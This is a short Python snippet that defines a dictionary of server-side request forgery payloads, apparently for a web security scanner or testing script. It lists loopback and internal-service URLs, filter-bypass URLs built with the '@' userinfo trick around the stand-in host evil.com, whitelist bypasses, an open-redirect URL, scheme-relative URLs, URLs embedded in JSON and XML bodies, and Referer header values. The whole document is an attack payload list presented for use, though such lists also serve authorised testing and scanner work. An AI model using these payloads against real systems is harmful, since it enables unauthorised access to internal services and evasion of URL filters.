payloads = {
    "ssrf_server": ["http://127.0.0.1", "http://localhost"],
    "ssrf_backend": ["http://internal-service", "http://database-service"],
    "blacklist_bypass": ["http://127.0.0.1@evil.com", "http://localhost@evil.com"],
    "whitelist_bypass": ["http://whitelisted.com@127.0.0.1", "http://whitelisted.com@localhost"],
    "open_redirect": ["http://vulnerable-site.com/redirect?url=http://evil.com"],
    "partial_urls": ["//localhost", "//127.0.0.1"],
    "urls_in_data": ['{"url": "http://127.0.0.1"}', '<url>http://127.0.0.1</url>'],
    "referer_header": ["http://127.0.0.1", "http://localhost"]
}